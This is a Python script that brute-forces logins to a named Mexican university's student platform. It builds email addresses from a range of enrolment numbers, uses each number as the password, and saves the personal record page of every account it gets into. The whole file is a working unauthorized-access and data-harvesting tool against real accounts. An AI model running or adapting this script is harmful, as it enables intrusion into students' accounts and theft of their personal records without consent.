import os
import json
import requests
from bs4 import BeautifulSoup

start_numeber = int(input("Valor a iniciar (2209XXXX):")) + 22090000
end_number = int(input("Valor a termiar (2209XXXX):")) + 22090000
lista_numeros = range(start_numeber, end_number + 1)
lista_perfiles = map(
    lambda x: {"email": str(x) + "@alumno.utmetropolitana.edu.mx", "pass": str(x)}, lista_numeros
)

expediente_url = 'https://plataforma.utmetropolitana.edu.mx/panel/mi_expediente.php'
os.makedirs('pages', exist_ok=True)

for perfil in lista_perfiles:
    print(f'Logging in with {perfil["email"]}...')
    response = requests.post('https://plataforma.utmetropolitana.edu.mx/ingresar.php', data=perfil,
                             allow_redirects=False)
    if not response.cookies:
        print(f'Error logging in with {perfil["email"]}')
        continue

    response = requests.get(expediente_url, cookies=response.cookies)
    if (response.text == "notfound.html"):
        print("Token expired?")
        continue

    print(f'Expediente obtenido para {perfil["email"]}')
    os.makedirs('../raw_html', exist_ok=True)
    with open(f'raw_html/{perfil["email"]}.html', 'w') as file:
        file.write(response.text)